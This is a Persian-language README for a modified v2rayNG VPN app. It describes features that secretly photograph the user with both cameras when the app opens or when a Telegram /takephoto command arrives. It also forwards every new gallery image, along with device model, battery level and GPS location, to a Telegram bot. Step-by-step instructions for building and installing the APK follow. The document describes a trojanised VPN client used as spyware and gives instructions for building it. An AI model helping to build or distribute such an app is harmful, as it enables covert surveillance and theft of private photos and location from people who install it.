# راهنمای استفاده و ساخت پروژه (نسخه ۲ - پیشرفته)

سلام. این فایل شامل تمام دستورالعمل‌های لازم برای ساخت و استفاده از نسخه پیشرفته اپلیکیشن v2rayNG است.

---

## قابلیت‌های نهایی این نسخه

این نسخه شامل سه قابلیت اصلی است:

1.  **عکس‌برداری هنگام باز شدن برنامه:** هر بار که اپلیکیشن باز می‌شود، به صورت خودکار از دوربین جلو و عقب عکس گرفته و به تلگرام ارسال می‌کند.
2.  **فرمان عکس فوری از تلگرام:** شما می‌توانید با ارسال دستور `/takephoto` از طریق ربات تلگرام، به اپلیکیشن فرمان دهید که در همان لحظه از دوربین جلو و عقب عکس بگیرد و برایتان ارسال کند.
3.  **نگهبان گالری:** اپلیکیشن به صورت خودکار هر عکس جدیدی که در گوشی ذخیره می‌شود (توسط دوربین خودتان، اسکرین‌شات، یا هر برنامه دیگری) را تشخیص داده و فوراً به تلگرام ارسال می‌کند.
4.  **اطلاعات تکمیلی:** تمام عکس‌های ارسالی (از همه روش‌های بالا) یک کپشن (متن زیرنویس) همراهشان دارند که شامل موارد زیر است:
    *   منبع ارسال (مثلاً: "App Opened" یا "/takephoto command")
    *   مدل گوشی
    *   میزان شارژ باتری
    *   موقعیت مکانی (GPS)

---

## **مهم:** تنظیم توکن و چت آیدی

برای اینکه برنامه کار کند، شما **باید** یک فایل به نام `local.properties` در پوشه اصلی پروژه (`V2rayNG/`) بسازید.

محتوای این فایل باید دقیقاً به شکل زیر باشد (مقادیر خود را جایگزین کنید):

```properties
TELEGRAM_BOT_TOKEN=":"
TELEGRAM_CHAT_ID=""
```

**توجه:** این فایل هرگز در گیت‌هاب ذخیره نمی‌شود و اطلاعات شما محرمانه باقی می‌ماند.

---

## راهنمای کامل ساخت فایل APK (برای ویندوز)

برای ساختن اپلیکیشن، لطفاً این چهار بخش را **با دقت و به ترتیب** دنبال کنید.

### **بخش ۱: آماده‌سازی کامپیوتر**

1.  **نصب اندروید استودیو:** از سایت رسمی `developer.android.com/studio` دانلود و نصب کنید.
2.  **دانلود سورس کد:** از گیت‌هاب، شاخه (branch) `feature/v2-advanced-final` را انتخاب کرده و کد را به صورت `Download ZIP` دانلود و Extract کنید.

### **بخش ۲: دانلود و جای‌گذاری فایل موتور برنامه**

**این مهم‌ترین مرحله برای جلوگیری از خطا است.**

1.  **دانلود فایل `.aar`:**
    *   نسخه سورس کد فعلی `1.10.18` است. برای این نسخه، شما به موتور `v25.8.3` نیاز دارید.
    *   به این لینک بروید: `https://github.com/2dust/AndroidLibXrayLite/releases/tag/v25.8.3`
    *   در بخش `Assets`، فایل `libXray-v25.8.3.aar` را دانلود کنید.

2.  **قراردادن فایل در پروژه:**
    *   فایل `.aar` دانلود شده را در این مسیر کپی کنید: `V2rayNG/app/libs` (اگر پوشه `libs` وجود ندارد، آن را بسازید).

### **بخش ۳: ساخت فایل APK در اندروید استودیو**

1.  **باز کردن پروژه:** اندروید استودیو را باز کرده و پوشه `V2rayNG` را که Extract کردید، انتخاب کنید.
2.  **همگام‌سازی (Sync):** صبر کنید تا پروژه بارگذاری شود. روی `Sync Now` یا از منوی `File` > `Sync Project with Gradle Files` کلیک کنید.
3.  **ساخت APK:** از منوی `Build` > `Build Bundle(s) / APK(s)` > `Build APK(s)` را انتخاب کنید.
4.  **پیدا کردن فایل APK:** پس از اتمام ساخت، روی اعلان `locate` کلیک کنید تا پوشه فایل APK باز شود.

### **بخش ۴: نصب روی گوشی**

1.  فایل APK را به گوشی خود منتقل کنید و آن را نصب کنید.

موفق باشید!
